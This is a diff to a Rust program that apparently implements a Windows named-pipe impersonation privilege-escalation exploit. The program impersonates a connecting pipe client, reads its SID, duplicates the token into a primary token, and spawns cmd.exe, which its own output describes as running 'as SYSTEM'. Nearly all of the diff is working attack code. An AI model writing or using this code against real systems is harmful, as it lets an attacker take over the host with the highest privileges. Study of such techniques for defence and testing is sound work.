@@ -1,12 +1,13 @@
-use std::{env, ptr};
+use std::{env, ptr, mem};
 
-use windows::Win32::Security::TOKEN_ALL_ACCESS;
+use windows::Win32::Security::{DuplicateTokenEx, TOKEN_TYPE, SECURITY_IMPERSONATION_LEVEL, TOKEN_ACCESS_MASK};
 use windows::Win32::Security::{GetTokenInformation, TOKEN_INFORMATION_CLASS, Authorization::ConvertSidToStringSidW, TOKEN_USER};
 use windows::Win32::Storage::FileSystem::{PIPE_ACCESS_DUPLEX};
 use windows::Win32::System::Pipes::{CreateNamedPipeA, ConnectNamedPipe, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE, PIPE_READMODE_BYTE};
 use windows::Win32::Foundation::{HANDLE, WIN32_ERROR, GetLastError, INVALID_HANDLE_VALUE};
-use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken};
-use windows::core::{PCSTR, PWSTR};
+use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken, CreateProcessWithTokenW, CREATE_PROCESS_LOGON_FLAGS, STARTUPINFOW, PROCESS_INFORMATION};
+use windows::core::{PCSTR, PWSTR, PCWSTR};
+use windows::w;
 use std::ffi::c_void;
 
 fn main() {
@@ -48,7 +49,7 @@ fn main() {
 
         if !OpenThreadToken(
             GetCurrentThread(),
-            TOKEN_ALL_ACCESS,
+            TOKEN_ACCESS_MASK(983551),
             false,
             &mut h_token as *mut HANDLE
         ).as_bool() {
@@ -92,5 +93,40 @@ fn main() {
         let priv_sid: String = p_str_sid.to_string().unwrap();
 
         println!("[+] Found SID: {priv_sid}");
+
+        let mut ph_newtoken: HANDLE = INVALID_HANDLE_VALUE;
+
+        println!("[+] Creating primary token from impersonation token");
+        if !DuplicateTokenEx(
+            h_token,
+            TOKEN_ACCESS_MASK(983551),
+            ptr::null_mut(),
+            SECURITY_IMPERSONATION_LEVEL(2),
+            TOKEN_TYPE(1),
+            &mut ph_newtoken as *mut HANDLE
+        ).as_bool() {
+            let e: WIN32_ERROR = GetLastError();
+            panic!("Error converting token: {:?}", e);
+        }
+
+        println!("[+] Opening cmd as SYSTEM");
+        let cmd_str: PWSTR = PWSTR::from_raw(w!("C:\\Windows\\System32\\cmd.exe").as_ptr() as *mut u16);
+        let mut si: STARTUPINFOW = STARTUPINFOW::default();
+        si.cb = mem::size_of::<STARTUPINFOW>() as u32;
+        let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();
+        if !CreateProcessWithTokenW(
+            ph_newtoken,
+            CREATE_PROCESS_LOGON_FLAGS(0),
+            PCWSTR::null(),
+            cmd_str,
+            0,
+            ptr::null() as *const c_void,
+            PCWSTR::null(),
+            &mut si,
+            &mut pi as *mut PROCESS_INFORMATION
+        ).as_bool() {
+            let e: WIN32_ERROR = GetLastError();
+            panic!("Error starting process: {:?}", e);
+        }
     }
 }
